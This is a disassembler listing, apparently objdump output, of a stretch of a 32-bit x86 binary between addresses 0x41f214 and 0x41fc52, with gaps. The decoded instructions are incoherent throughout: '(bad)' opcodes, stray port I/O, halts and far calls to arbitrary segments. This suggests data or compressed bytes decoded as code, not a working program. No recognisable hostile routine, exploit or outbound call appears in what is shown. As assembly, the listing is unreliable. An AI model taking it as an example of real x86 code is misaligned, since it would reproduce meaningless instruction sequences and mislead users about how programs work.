  41f214:	pop    ecx
  41f215:	cmp    dl,BYTE PTR [esi-0x46]
  41f218:	xchg   ebp,eax
  41f219:	xchg   BYTE PTR ds:0xdc9bccf4,ah
  41f21f:	mov    ah,0x8e
  41f221:	sbb    al,0x8e
  41f223:	outs   dx,BYTE PTR ds:[esi]
  41f224:	ins    BYTE PTR es:[edi],dx
  41f225:	clc    
  41f226:	sub    BYTE PTR [esi+0x39473d92],bh
  41f22c:	stos   BYTE PTR es:[edi],al
  41f22d:	hlt    
  41f22e:	call   0xb423056
  41f233:	fistp  DWORD PTR [edi-0x1]
  41f236:	je     0x41f1d2
  41f238:	or     al,0xd8
  41f23a:	loope  0x41f27d
  41f23c:	xchg   BYTE PTR [esi-0x1b028100],ch
  41f242:	cmp    eax,0x502d23
  41f247:	ds mov bh,0xa4
  41f24a:	std    
  41f24b:	ss pop esp
  41f24d:	arpl   WORD PTR [ecx],bp
  41f24f:	inc    esi
  41f250:	js     0x41f22d
  41f252:	(bad)  
  41f253:	das    
  41f254:	dec    ebp
  41f255:	mov    ah,0xc4
  41f257:	jl     0x41f280
  41f259:	mov    edi,esi
  41f25b:	inc    ebp
  41f25c:	mov    es,WORD PTR [ecx-0x54927f5a]
  41f262:	mov    BYTE PTR [esi+0x41705019],bh
  41f268:	es out 0xe9,al
  41f26b:	nop
  41f26c:	call   0x3961:0x13e80290
  41f273:	iret   
  41f274:	sbb    dh,bl
  41f276:	mov    ds:0x34981db,al
  41f27b:	aad    0x50
  41f27d:	imul   edi,edi,0x36386e5d
  41f283:	xor    eax,0x8824b484
  41f288:	sbb    bl,BYTE PTR [ebx-0x34be3e88]
  41f28e:	retf   0xca2e
  41f291:	neg    BYTE PTR [edi]
  41f293:	jnp    0x41f308
  41f295:	jnp    0x41f2ce
  41f297:	imul   ebp,DWORD PTR [eax-0x7b55d4d8],0x22ed8c9b
  41f2a1:	in     eax,dx
  41f2a2:	add    ah,bh
  41f2a4:	jo     0x41f2cd
  41f2a6:	fist   WORD PTR [ebp+0x56]
  41f2a9:	adc    ebx,ebx
  41f2ab:	mov    bl,0x6e
  41f2ad:	mov    ebx,DWORD PTR [edi-0x80]
  41f2b0:	cmp    eax,0xd385f761
  41f2b5:	mul    bh
  41f2b7:	inc    esp
  41f2b8:	enter  0x2de1,0x98
  41f2bc:	pop    esp
  41f2bd:	xlat   BYTE PTR ds:[ebx]
  41f2be:	jge    0x41f265
  41f2c0:	addr16 push ecx
	...
  41f332:	add    BYTE PTR [eax],al
  41f334:	mov    DWORD PTR [edx],edx
  41f336:	ja     0x41f357
  41f338:	(bad)  
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0xad51:0x979531a0
  41f343:	cld    
  41f344:	inc    eax
  41f345:	dec    edi
  41f346:	add    DWORD PTR [eax],eax
  41f348:	test   BYTE PTR [eax],0x0
  41f34b:	add    bl,dl
  41f34d:	sbb    DWORD PTR [eax+0x7734998d],0xffffff92
  41f354:	sbb    eax,0x13af269b
  41f359:	sbb    DWORD PTR [ecx],ebx
  41f35b:	aam    0xf3
  41f35d:	sub    eax,0x792d680
  41f362:	sub    BYTE PTR [edx+edx*1+0x728e45d3],0x26
  41f36a:	daa    
  41f36b:	adc    BYTE PTR [edx],dh
  41f36d:	ins    BYTE PTR es:[edi],dx
  41f36e:	xchg   edi,eax
  41f36f:	xor    DWORD PTR [ebx+0x3e],edi
  41f372:	mov    al,0xed
  41f374:	add    DWORD PTR [eax+0x3],ebp
  41f377:	xor    BYTE PTR [ecx+0x2648e0f2],cl
  41f37d:	scas   al,BYTE PTR es:[edi]
  41f37e:	sbb    DWORD PTR [esi+0x40495e1e],esp
  41f384:	adc    BYTE PTR [eax+0x2bfc3607],ah
  41f38a:	dec    eax
  41f38b:	mov    eax,ds:0x3a578d18
  41f390:	outs   dx,DWORD PTR ds:[esi]
  41f391:	mov    ah,0xb1
  41f393:	mov    DWORD PTR [ebx-0x56a55425],esi
  41f399:	fisub  DWORD PTR [edi]
  41f39b:	fmulp  st(7),st
  41f39d:	stos   BYTE PTR es:[edi],al
  41f39e:	sbb    ebx,DWORD PTR [ebx+0x30299f14]
  41f3a4:	adc    BYTE PTR cs:[esi+0x6c016000],ch
  41f3ab:	(bad)  
  41f3ac:	call   0x4ab0:0x13fbdc12
  41f3b3:	xor    eax,0x551c3820
  41f3b8:	or     ecx,ecx
  41f3ba:	push   eax
  41f3bb:	push   cs
  41f3bc:	and    al,0xf2
  41f3be:	jl     0x41f34e
  41f3c0:	xchg   DWORD PTR [edi+0xfb1b1e4],edx
  41f3c6:	jl     0x41f3c0
  41f3c8:	das    
  41f3c9:	xchg   esi,eax
  41f3ca:	add    ch,bl
  41f3cc:	xor    dl,ch
  41f3ce:	xchg   esi,eax
  41f3cf:	xchg   ecx,eax
  41f3d0:	(bad)  
  41f3d1:	popa   
  41f3d2:	mov    dh,0x2a
  41f3d4:	fnsave ds:0x652972db
  41f3da:	xlat   BYTE PTR ds:[ebx]
  41f3db:	cli    
  41f3dc:	xor    edi,DWORD PTR [ebx+eiz*1-0x464abe9d]
  41f3e3:	mov    bl,0x7c
  41f3e5:	dec    eax
  41f3e6:	sub    edx,DWORD PTR [edx+ecx*2-0x71fe2bd]
  41f3ed:	mov    eax,ds:0x28876d28
  41f3f2:	ds sbb ebx,ecx
  41f3f5:	fild   QWORD PTR [eax+0x142405e8]
  41f3fb:	sbb    al,0xc5
  41f3fd:	mov    eax,0xcf0a1af7
  41f402:	lahf   
  41f403:	mov    bl,0x4
  41f405:	pop    ebx
  41f406:	test   eax,0xd4ca2463
  41f40b:	(bad)  
  41f40c:	in     eax,dx
  41f40d:	mov    ecx,0x7d52e030
  41f412:	call   0x4065:0xa497c929
  41f419:	popf   
  41f41a:	mov    cl,0x47
  41f41c:	mov    dl,0x6d
  41f41e:	xchg   ecx,eax
  41f41f:	xor    DWORD PTR [edi+eiz*1-0x4c383a91],ebp
  41f426:	ins    BYTE PTR es:[edi],dx
  41f427:	add    eax,0xacc1609e
  41f42d:	jp     0x41f40b
  41f42f:	jg     0x41f3f9
  41f431:	add    ebp,0x51facfc6
  41f437:	cmp    eax,0x9f4c366
  41f43c:	mov    bl,0xd3
  41f43e:	inc    esi
  41f43f:	fbld   TBYTE PTR [edx-0x3d]
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0xd2
  41f4c1:	push   es
  41f4c2:	fwait
  41f4c3:	(bad)  
  41f4c4:	ss push eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    BYTE PTR [ebx-0x1db1d4b0],bl
  41f4d1:	xchg   BYTE PTR [esi+eax*2-0xd3af83c],ah
  41f4d8:	pop    es
  41f4d9:	test   al,0xc2
  41f4db:	pop    ebx
  41f4dc:	mov    edi,0x91c8a70c
  41f4e1:	iret   
  41f4e2:	xchg   ebx,eax
  41f4e3:	rcr    BYTE PTR [eax+esi*4],0x23
  41f4e7:	mov    edi,esi
  41f4e9:	mov    al,ds:0x14a6c07f
  41f4ee:	xchg   edi,eax
  41f4ef:	mov    eax,ds:0xc4f94e50
  41f4f4:	jle    0x41f496
  41f4f6:	push   ebp
  41f4f7:	shr    DWORD PTR [esi-0x380c08e2],cl
  41f4fd:	xchg   ebx,eax
  41f4fe:	dec    edi
  41f4ff:	retf   
  41f500:	pop    edi
  41f501:	cdq    
  41f502:	pop    ecx
  41f503:	mov    ch,0xda
  41f505:	inc    ebx
  41f506:	mov    dh,0x2b
  41f508:	nop
  41f509:	dec    ecx
  41f50a:	ins    DWORD PTR es:[edi],dx
  41f50b:	ror    BYTE PTR [eax-0xbda4d00],0x48
  41f512:	or     edi,DWORD PTR [eax+0x4c451b47]
  41f518:	in     al,0xc9
  41f51a:	lahf   
  41f51b:	cmp    al,0xf6
  41f51d:	sbb    bl,BYTE PTR [eax+0x3e]
  41f520:	pop    ebx
  41f521:	mov    dh,0x49
  41f523:	out    0xf0,eax
  41f525:	sub    BYTE PTR [edx-0x64],dl
  41f528:	push   ebx
  41f529:	in     al,0xf
  41f52b:	or     al,0x96
  41f52d:	rcl    esi,cl
  41f52f:	pusha  
  41f530:	loope  0x41f4f7
  41f532:	scas   al,BYTE PTR es:[edi]
  41f533:	adc    edx,esp
  41f535:	stc    
  41f536:	jl     0x41f523
  41f538:	cld    
  41f539:	xchg   BYTE PTR [eax-0x17],dh
  41f53c:	test   dh,bl
  41f53e:	push   0x16
  41f540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f541:	xchg   esp,eax
  41f542:	call   0xb875e43e
  41f547:	sbb    dl,ah
  41f549:	aam    0xc9
  41f54b:	leave  
  41f54c:	sub    DWORD PTR [edi+0x5389f3f0],esp
  41f552:	sub    eax,0x90552acf
  41f557:	data16 jg 0x41f53e
  41f55a:	sbb    BYTE PTR [eax-0x1a],0x9d
  41f55e:	arpl   si,cx
  41f560:	hlt    
  41f561:	mov    al,ds:0xc9ca52e2
  41f566:	in     al,dx
  41f567:	nop
  41f568:	mov    ?,WORD PTR [edx]
  41f56a:	xor    edi,DWORD PTR [edi-0x3e]
  41f56d:	cmp    ecx,DWORD PTR [esi]
  41f56f:	or     edx,DWORD PTR [eax+0x6dcb5fe]
  41f575:	add    BYTE PTR [esi-0x35],cl
  41f578:	mov    edx,0x341e5951
  41f57d:	mov    ebx,0x7b9ce6a2
  41f582:	push   ebx
  41f583:	pop    ebx
  41f584:	loope  0x41f599
  41f586:	inc    ebx
  41f587:	ins    DWORD PTR es:[edi],dx
  41f588:	inc    esi
  41f589:	add    BYTE PTR [ecx+0xac45895],dh
  41f58f:	in     al,dx
  41f590:	inc    esi
  41f591:	ret    
  41f592:	or     DWORD PTR [edx+0x2c],esp
  41f595:	aas    
  41f596:	repz loope 0x41f5c0
  41f599:	jne    0x41f554
  41f59b:	icebp  
  41f59c:	ret    
  41f59d:	ds popf 
  41f59f:	cmc    
  41f5a0:	fist   WORD PTR [edi+0x36]
  41f5a3:	jp     0x41f575
  41f5a5:	repz (bad) [ecx+0x59]
  41f5a9:	inc    esp
  41f5aa:	mov    edx,0x735e08ab
  41f5af:	dec    esp
  41f5b0:	pop    eax
  41f5b1:	mov    ds:0xba76d347,eax
  41f5b6:	jmp    FWORD PTR ds:[ebx-0xa]
  41f5ba:	retf   0x652f
  41f5bd:	dec    ebx
  41f5be:	cli    
  41f5bf:	dec    esp
  41f5c0:	loop   0x41f565
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0xa601e835
  41f641:	jecxz  0x41f6ba
  41f643:	push   ebp
  41f644:	sub    al,0x51
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    bl,bh
  41f64d:	sbb    eax,0x986375be
  41f652:	repz test BYTE PTR [ecx-0x2f],ch
  41f656:	lahf   
  41f657:	add    al,0xda
  41f659:	cmp    BYTE PTR [ebp-0x24],al
  41f65c:	mov    edi,DWORD PTR [edi]
  41f65e:	sbb    al,0x76
  41f660:	adc    bl,0x19
  41f663:	(bad)  
  41f664:	fist   WORD PTR [ebp-0x61]
  41f667:	scas   eax,DWORD PTR es:[edi]
  41f668:	dec    edx
  41f669:	jl     0x41f65e
  41f66b:	cdq    
  41f66c:	shl    al,cl
  41f66e:	adc    al,0x5f
  41f670:	inc    edx
  41f671:	sub    BYTE PTR [edx+0x2f23d4c2],0xdd
  41f678:	inc    esi
  41f679:	ins    DWORD PTR es:[edi],dx
  41f67a:	inc    eax
  41f67b:	pop    edi
  41f67c:	fistp  QWORD PTR [ecx]
  41f67e:	cdq    
  41f67f:	or     eax,0x73c3f978
  41f684:	cmp    eax,0xfdbac92b
  41f689:	xchg   ebx,eax
  41f68a:	xor    BYTE PTR [ecx-0x5f],dl
  41f68d:	cmp    dl,BYTE PTR [eax+ebp*1+0x5b]
  41f691:	adc    ch,BYTE PTR [edx*4-0x4289ec1a]
  41f698:	lods   al,BYTE PTR ds:[esi]
  41f699:	cli    
  41f69a:	sub    DWORD PTR [ecx+0x5d3f213f],eax
  41f6a0:	mov    ecx,0x8a6bd8af
  41f6a5:	lods   eax,DWORD PTR ds:[esi]
  41f6a6:	sub    DWORD PTR [ecx],esp
  41f6a8:	mov    bh,0xc6
  41f6aa:	add    ecx,esp
  41f6ac:	mov    al,ds:0x1cc34d20
  41f6b1:	xchg   esp,eax
  41f6b2:	les    ebx,FWORD PTR [ecx]
  41f6b4:	inc    ebp
  41f6b5:	icebp  
  41f6b6:	xchg   ebp,eax
  41f6b7:	popa   
  41f6b8:	mov    ebx,DWORD PTR fs:[eax]
  41f6bb:	int3   
  41f6bc:	retf   
  41f6bd:	int    0xd9
  41f6bf:	js     0x41f739
  41f6c1:	and    eax,0xf44c6177
  41f6c6:	push   ss
  41f6c7:	fstp   st(4)
  41f6c9:	or     al,BYTE PTR [eax+0x3e159301]
  41f6cf:	lods   al,BYTE PTR ds:[esi]
  41f6d0:	xchg   ebp,eax
  41f6d1:	retf   0x792a
  41f6d4:	pop    esp
  41f6d5:	sbb    DWORD PTR [eax-0x46b01f6d],ebx
  41f6db:	mov    dh,0xaa
  41f6dd:	pushf  
  41f6de:	or     dl,BYTE PTR [edx-0x59]
  41f6e1:	pushf  
  41f6e2:	adc    ecx,DWORD PTR [edi+0x1a75077c]
  41f6e8:	test   BYTE PTR [ebp+0x1c],ah
  41f6eb:	cdq    
  41f6ec:	push   DWORD PTR [eax-0x59]
  41f6ef:	inc    esi
  41f6f0:	cvtdq2ps xmm6,XMMWORD PTR [edi-0x418097f5]
  41f6f7:	and    BYTE PTR [eax+0x3b],ah
  41f6fa:	mov    eax,ds:0xbc6117cf
  41f6ff:	mov    DWORD PTR [ecx],ecx
  41f701:	jae    0x41f75c
  41f703:	daa    
  41f704:	(bad)  
  41f705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f706:	and    al,0xc2
  41f708:	(bad)  
  41f709:	pop    edi
  41f70a:	into   
  41f70b:	or     BYTE PTR [eax+ebx*2-0x3f5060f6],bh
  41f712:	adc    eax,0x19cc1e43
  41f717:	addr16 (bad) 
  41f719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f71a:	xchg   DWORD PTR [esi+0x64],ecx
  41f71d:	dec    esp
  41f71e:	xchg   ebx,eax
  41f71f:	dec    ebp
  41f720:	scas   eax,DWORD PTR es:[edi]
  41f721:	cmp    ebp,DWORD PTR [edi+0xf]
  41f724:	mov    edi,0xcd490275
  41f729:	xor    ah,ch
  41f72b:	inc    edx
  41f72c:	inc    esp
  41f72d:	gs scas eax,DWORD PTR es:[edi]
  41f72f:	repnz or BYTE PTR [ebx+0x7d],dl
  41f733:	mov    edi,0x211a4290
  41f738:	dec    ebp
  41f739:	inc    ecx
  41f73a:	mov    DWORD PTR [esi],edx
  41f73c:	sbb    eax,esp
  41f73e:	mov    ss,WORD PTR [eax]
  41f740:	mov    bh,0x7a
	...
  41f7b2:	add    BYTE PTR [eax],al
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	lahf   
  41f7c1:	test   al,0x96
  41f7c3:	jo     0x41f7e7
  41f7c5:	push   edx
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	test   BYTE PTR [eax],0x0
  41f7cb:	add    BYTE PTR [edx+eiz*4+0x1f],cl
  41f7cf:	push   ss
  41f7d0:	push   0x1b
  41f7d2:	xor    dl,ch
  41f7d4:	gs int 0x63
  41f7d7:	adc    cl,dh
  41f7d9:	push   eax
  41f7da:	fsubr  QWORD PTR [eax+ebx*8]
  41f7dd:	xor    eax,0xe6ce7285
  41f7e2:	jae    0x41f811
  41f7e4:	push   ds
  41f7e5:	aaa    
  41f7e6:	push   esp
  41f7e7:	add    esp,eax
  41f7e9:	pushf  
  41f7ea:	mov    edi,0x2b22f455
  41f7ef:	(bad)
  41f7f2:	addr16 inc ebp
  41f7f4:	pusha  
  41f7f5:	push   cs
  41f7f6:	add    eax,DWORD PTR [eax-0xc]
  41f7f9:	sbb    ebp,DWORD PTR [ecx]
  41f7fb:	jns    0x41f7a3
  41f7fd:	sub    ecx,DWORD PTR [edi+ecx*4]
  41f800:	mov    dh,0x17
  41f802:	rcl    DWORD PTR [ebx+0x18],cl
  41f805:	mov    ?,WORD PTR [eax+0x70]
  41f808:	imul   ebp,DWORD PTR [esi],0xffffffdb
  41f80b:	ret    
  41f80c:	loopne 0x41f851
  41f80e:	sub    BYTE PTR [edi],ch
  41f810:	outs   dx,BYTE PTR ds:[esi]
  41f811:	in     al,0x4c
  41f813:	xchg   esp,eax
  41f814:	sub    al,bl
  41f816:	lock (bad) 
  41f818:	leave  
  41f819:	dec    edi
  41f81a:	push   ecx
  41f81b:	loope  0x41f870
  41f81d:	pop    edx
  41f81e:	adc    edx,DWORD PTR [esi]
  41f820:	pop    ebx
  41f821:	lods   eax,DWORD PTR ds:[esi]
  41f822:	out    dx,al
  41f823:	or     ecx,ebp
  41f825:	mov    DWORD PTR [esi-0xc89ce42],esp
  41f82b:	xchg   edx,eax
  41f82c:	mov    ecx,0x55424e4d
  41f831:	sahf   
  41f832:	mov    BYTE PTR [ecx+0x617e239f],dh
  41f838:	xor    esi,DWORD PTR [ecx]
  41f83a:	ror    DWORD PTR [edx+0x2e6066e1],0xed
  41f841:	lock rol BYTE PTR [edi+0x73],1
  41f845:	jg     0x41f863
  41f847:	(bad)  
  41f848:	loopne 0x41f82d
  41f84a:	adc    al,0x78
  41f84c:	cli    
  41f84d:	jp     0x41f8cb
  41f84f:	mov    ch,0x4d
  41f851:	inc    esi
  41f852:	adc    DWORD PTR [ecx-0x2cb4e317],edi
  41f858:	imul   ebx,ebp,0xffffffbc
  41f85b:	inc    eax
  41f85c:	les    edi,FWORD PTR [edx+edi*2]
  41f85f:	gs stc 
  41f861:	test   eax,0xa3f46061
  41f866:	ja     0x41f877
  41f868:	or     esp,DWORD PTR [edx+eax*4-0xe40175b]
  41f86f:	push   edi
  41f870:	loop   0x41f80e
  41f872:	scas   al,BYTE PTR es:[edi]
  41f873:	mov    ch,0xba
  41f875:	push   cs
  41f876:	inc    edi
  41f877:	jl     0x41f81f
  41f879:	mov    ds:0x70ec6b58,al
  41f87e:	mov    dl,0xce
  41f880:	(bad)  
  41f881:	fstp   DWORD PTR [esi+eax*4-0x3e255c4c]
  41f888:	rcr    DWORD PTR [esi+0x73],cl
  41f88b:	fs dec eax
  41f88d:	and    DWORD PTR [eax],esi
  41f88f:	pop    edi
  41f890:	mov    edx,0xe9e53bca
  41f895:	mov    ah,0xb7
  41f897:	or     ebx,DWORD PTR [edi+ebp*1+0x51]
  41f89b:	xor    al,0x18
  41f89d:	rcr    edx,1
  41f89f:	add    BYTE PTR [edi],ch
  41f8a1:	inc    esp
  41f8a2:	or     ax,0x42ba
  41f8a6:	test   BYTE PTR cs:[eax],bh
  41f8a9:	sbb    al,0x90
  41f8ab:	jge    0x41f8a3
  41f8ad:	mov    cl,0x20
  41f8af:	inc    ebp
  41f8b0:	es out dx,al
  41f8b2:	dec    edx
  41f8b3:	mov    dl,0x32
  41f8b5:	mov    ds:0x8d0ebc29,al
  41f8ba:	mov    cl,0x9
  41f8bc:	mov    al,0x79
  41f8be:	ret    0x6da8
  41f8c1:	and    al,0x0
	...
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x1a9ffef7
  41f941:	lds    ebp,FWORD PTR [ecx]
  41f943:	xchg   esi,eax
  41f944:	sbb    BYTE PTR [ebx+0x1],dl
  41f947:	add    dh,dh
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    dl,dh
  41f94d:	xchg   DWORD PTR [edx+0x5f00c028],ebp
  41f953:	das    
  41f954:	push   ecx
  41f955:	xor    BYTE PTR [eax],dl
  41f957:	repnz mov ebp,0xb5d92c01
  41f95d:	xor    BYTE PTR [ecx-0x41],dh
  41f960:	ss cli 
  41f962:	scas   al,BYTE PTR es:[edi]
  41f963:	test   al,0x82
  41f965:	pushf  
  41f966:	aas    
  41f967:	pop    ss
  41f968:	fisub  WORD PTR [ebx-0x5fe2ab8a]
  41f96e:	adc    eax,0x4aa067cc
  41f973:	xor    al,0xaf
  41f975:	loop   0x41f9bc
  41f977:	mov    ecx,fs
  41f979:	int3   
  41f97a:	retf   
  41f97b:	cmp    DWORD PTR [ebp-0x73],esp
  41f97e:	cli    
  41f97f:	cwde   
  41f980:	or     DWORD PTR [ebp+0x163681b3],eax
  41f986:	shl    BYTE PTR [esi+0xc],1
  41f989:	jbe    0x41f9d4
  41f98b:	cwde   
  41f98c:	or     BYTE PTR [edx-0x2],bl
  41f98f:	pop    es
  41f990:	and    DWORD PTR [eax+eiz*8+0x23431e85],edi
  41f997:	(bad)  
  41f998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f999:	push   eax
  41f99a:	mov    ds:0x13e8bbf4,al
  41f99f:	push   cs
  41f9a0:	call   0x167a:0x4a8a8cec
  41f9a7:	in     eax,0x9c
  41f9a9:	(bad)  
  41f9ab:	adc    al,0x52
  41f9ad:	std    
  41f9ae:	je     0x41f9a9
  41f9b0:	call   0x71382c04
  41f9b5:	xchg   ebx,eax
  41f9b6:	mov    al,ds:0x3a828ead
  41f9bb:	aas    
  41f9bc:	push   ds
  41f9bd:	jno    0x41f943
  41f9bf:	mov    al,0x3a
  41f9c1:	inc    esi
  41f9c2:	xor    BYTE PTR [eax-0xe],dl
  41f9c5:	xor    DWORD PTR [ebx-0x9d2778a],ebx
  41f9cb:	pop    es
  41f9cc:	mov    ah,0x43
  41f9ce:	mov    ds:0x3c58e9e4,eax
  41f9d3:	adc    BYTE PTR [eax+0x10dbb2f8],0x87
  41f9da:	sbb    al,0x52
  41f9dc:	push   ss
  41f9dd:	adc    cl,BYTE PTR [ebp-0x3b]
  41f9e0:	lods   al,BYTE PTR ds:[esi]
  41f9e1:	adc    ebp,esp
  41f9e3:	es mov cl,0x2c
  41f9e6:	lods   eax,DWORD PTR ds:[esi]
  41f9e7:	and    BYTE PTR [ebx+0x65],0xf
  41f9eb:	jp     0x41f9b0
  41f9ed:	xchg   ebp,eax
  41f9ee:	aaa    
  41f9ef:	or     ch,BYTE PTR [eax]
  41f9f1:	pop    edx
  41f9f2:	sbb    eax,0x265347ee
  41f9f7:	popf   
  41f9f8:	or     DWORD PTR [ecx+0x67167b6],ebp
  41f9fe:	test   eax,0x3a6086a6
  41fa03:	test   eax,0x176df005
  41fa08:	aam    0xed
  41fa0a:	mov    eax,ds:0xbb24c0c8
  41fa0f:	stc    
  41fa10:	jle    0x41f9e1
  41fa12:	or     DWORD PTR [ebp-0x3],esi
  41fa15:	aad    0x90
  41fa17:	dec    esp
  41fa18:	loopne 0x41f9e9
  41fa1a:	out    dx,al
  41fa1b:	sub    al,0x91
  41fa1d:	(bad)  
  41fa1e:	stos   BYTE PTR es:[edi],al
  41fa1f:	retf   
  41fa20:	xchg   BYTE PTR [ecx+ebp*8-0x1d],dl
  41fa24:	xchg   esp,eax
  41fa25:	pop    DWORD PTR [eax+0xd]
  41fa28:	pop    esi
  41fa29:	dec    ecx
  41fa2a:	push   0xffffff8b
  41fa2c:	icebp  
  41fa2d:	icebp  
  41fa2e:	repnz dec ebx
  41fa30:	jmp    0x90f29156
  41fa35:	int    0xfd
  41fa37:	pop    esi
  41fa38:	xchg   edx,eax
  41fa39:	xor    eax,0xc0a286ae
  41fa3e:	xlat   BYTE PTR ds:[ebx]
  41fa3f:	jo     0x41fa47
  41fa41:	add    BYTE PTR [eax],0x0
	...
  41fab4:	adc    ch,BYTE PTR [edi]
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	dec    edi
  41fac1:	rol    ah,cl
  41fac3:	add    DWORD PTR [esi],ecx
  41fac5:	push   esp
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    BYTE PTR [edx],bh
  41facd:	icebp  
  41face:	jne    0x41fa87
  41fad0:	mov    bl,ch
  41fad2:	outs   dx,BYTE PTR ds:[esi]
  41fad3:	(bad)  
  41fad4:	push   ss
  41fad5:	lods   eax,DWORD PTR ds:[esi]
  41fad6:	or     al,BYTE PTR [esi-0x33439a16]
  41fadc:	or     DWORD PTR [edi],ebp
  41fade:	lock out 0x3f,al
  41fae1:	push   ss
  41fae2:	add    BYTE PTR [ecx],0x50
  41fae5:	sbb    al,0xf2
  41fae7:	mov    ah,0xcb
  41fae9:	jg     0x41fa8e
  41faeb:	mov    WORD PTR [ecx],fs
  41faed:	in     eax,0xe5
  41faef:	sbb    edx,esi
  41faf1:	xor    BYTE PTR [ecx],bl
  41faf3:	sub    al,0xb0
  41faf5:	sbb    al,0xf2
  41faf7:	pop    ebp
  41faf8:	inc    ebx
  41faf9:	call   0x38ab:0xb8ab5805
  41fb00:	lds    ebp,FWORD PTR [ebp+0x4a176aa0]
  41fb06:	(bad)  
  41fb08:	inc    ebp
  41fb09:	push   edi
  41fb0a:	mov    esi,0x2cb9503e
  41fb0f:	lods   al,BYTE PTR ds:[esi]
  41fb10:	loopne 0x41fb79
  41fb12:	loop   0x41fb04
  41fb14:	pop    esi
  41fb15:	pusha  
  41fb16:	loopne 0x41fa9d
  41fb18:	pushf  
  41fb19:	mov    esi,0x82caf83a
  41fb1e:	xchg   ebp,eax
  41fb1f:	scas   al,BYTE PTR es:[edi]
  41fb20:	dec    edx
  41fb21:	psubsw mm3,QWORD PTR [esi-0x4e]
  41fb25:	imul   edi,DWORD PTR [edx-0x68],0xc
  41fb29:	jbe    0x41fb10
  41fb2b:	mov    eax,ds:0x39e8a926
  41fb30:	test   eax,0x844d55e4
  41fb35:	scas   al,BYTE PTR es:[edi]
  41fb36:	outs   dx,BYTE PTR ds:[esi]
  41fb37:	mov    ah,ah
  41fb39:	popf   
  41fb3a:	mov    edi,0x2cad6304
  41fb3f:	xchg   edx,eax
  41fb40:	stos   BYTE PTR es:[edi],al
  41fb41:	cmp    ch,BYTE PTR [ebp-0xe]
  41fb44:	push   ebp
  41fb45:	sub    al,0x43
  41fb47:	mov    edx,DWORD PTR [eax-0x30ac2a0b]
  41fb4d:	xor    ebx,DWORD PTR [edx]
  41fb4f:	outs   dx,BYTE PTR ds:[esi]
  41fb50:	pop    edi
  41fb51:	stos   DWORD PTR es:[edi],eax
  41fb52:	jle    0x41fb36
  41fb54:	retf   0x8d8f
  41fb57:	inc    ecx
  41fb58:	ins    BYTE PTR es:[edi],dx
  41fb59:	cmp    edi,eax
  41fb5b:	fistp  DWORD PTR [esi-0x2d]
  41fb5e:	nop
  41fb5f:	mov    eax,0x8ade1107
  41fb64:	add    ecx,0x3d47637b
  41fb6a:	push   ebp
  41fb6b:	xor    al,BYTE PTR [ecx+0x6bd53ced]
  41fb71:	lahf   
  41fb72:	(bad)  
  41fb73:	jo     0x41fbcc
  41fb75:	lds    edi,FWORD PTR [ebp+0x28496e32]
  41fb7b:	push   ebx
  41fb7c:	lea    edx,ds:0x18c7f43f
  41fb82:	loop   0x41fb3e
  41fb84:	adc    DWORD PTR [edx-0x56efeaf2],ebx
  41fb8a:	cmc    
  41fb8b:	call   FWORD PTR [ecx]
  41fb8d:	in     al,dx
  41fb8e:	aad    0x8
  41fb90:	adc    DWORD PTR [ebx],0x27
  41fb93:	popa   
  41fb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb95:	outs   dx,DWORD PTR ds:[esi]
  41fb96:	xor    ch,BYTE PTR [eax-0x7f]
  41fb99:	shr    DWORD PTR [ecx],cl
  41fb9b:	push   ss
  41fb9c:	mov    bh,0x79
  41fb9e:	loopne 0x41fb25
  41fba0:	retf   0x4498
  41fba3:	mov    al,0x7d
  41fba5:	cmp    BYTE PTR [edi],cl
  41fba7:	cmp    DWORD PTR [edi-0x2b8541f],ebx
  41fbad:	ja     0x41fc29
  41fbaf:	ja     0x41fbd0
  41fbb1:	movups XMMWORD PTR [ebx],xmm4
  41fbb4:	not    BYTE PTR [eax]
  41fbb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbb7:	or     al,0xf4
  41fbb9:	push   esp
  41fbba:	clc    
  41fbbb:	inc    eax
  41fbbc:	dec    esp
  41fbbd:	loopne 0x41fb7b
  41fbbf:	out    0xc1,al
  41fbc1:	test   eax,0x0
	...
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	inc    ecx
  41fc35:	icebp  
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x8c0e8ad2
  41fc42:	ror    DWORD PTR [edi],cl
  41fc44:	add    al,0x55
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	test   BYTE PTR [eax],0x0
  41fc4b:	add    BYTE PTR [ebx+ebp*1],ah
  41fc4e:	stos   DWORD PTR es:[edi],eax
  41fc4f:	dec    esp
  41fc50:	test   DWORD PTR [ecx],ebx
  41fc52:	bound  ebx,QWORD PTR [eax+0x7d]
